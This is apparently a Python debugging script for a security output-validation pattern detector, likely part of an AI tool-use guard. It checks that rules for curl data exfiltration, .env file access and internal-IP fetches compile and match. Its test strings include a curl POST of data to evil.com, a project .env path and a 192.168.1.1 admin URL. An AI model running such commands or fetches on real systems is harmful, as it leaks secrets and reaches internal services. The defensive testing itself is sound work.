import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from security.output_validation import ToolType
from security.output_validation.pattern_detector import create_pattern_detector
from security.output_validation.rules import get_default_rules

# Create detector
detector = create_pattern_detector()
all_rules = get_default_rules()
detector.add_rules(all_rules)

# Check compiled patterns
print("=== Checking compiled patterns ===\n")
print(f"Number of compiled patterns: {len(detector._compiled_patterns)}")

# Check specific rules
curl_rule_id = "bash-curl-data-exfil"
env_rule_id = "path-environment-file"
ip_rule_id = "web-fetch-internal-ip"

print(f"\nCurl rule compiled: {curl_rule_id in detector._compiled_patterns}")
if curl_rule_id in detector._compiled_patterns:
    pattern = detector._compiled_patterns[curl_rule_id]
    print(f"  Pattern object: {pattern}")
    test_cmd = "curl -X POST -d 'sensitive' https://evil.com"
    match = pattern.search(test_cmd)
    print(f"  Test command: {test_cmd}")
    print(f"  Match result: {match}")
    if match:
        print(f"  Matched text: {match.group(0)}")

print(f"\n.env rule compiled: {env_rule_id in detector._compiled_patterns}")
if env_rule_id in detector._compiled_patterns:
    pattern = detector._compiled_patterns[env_rule_id]
    print(f"  Pattern object: {pattern}")
    test_path = "project/.env"
    match = pattern.search(test_path)
    print(f"  Test path: {test_path}")
    print(f"  Match result: {match}")
    if match:
        print(f"  Matched text: {match.group(0)}")

print(f"\nInternal IP rule compiled: {ip_rule_id in detector._compiled_patterns}")
if ip_rule_id in detector._compiled_patterns:
    pattern = detector._compiled_patterns[ip_rule_id]
    print(f"  Pattern object: {pattern}")
    test_url = "http://192.168.1.1/admin"
    match = pattern.search(test_url)
    print(f"  Test URL: {test_url}")
    print(f"  Match result: {match}")
    if match:
        print(f"  Matched text: {match.group(0)}")

# Now check if rules have correct tool_types
print("\n=== Checking rule tool_types ===\n")
for rule_id in [curl_rule_id, env_rule_id, ip_rule_id]:
    rule = detector.get_rule_by_id(rule_id)
    if rule:
        print(f"{rule_id}:")
        print(f"  tool_types: {[t.value for t in rule.tool_types]}")
        print(f"  context: {rule.context}")
        print(f"  enabled: {rule.enabled}")
        print()
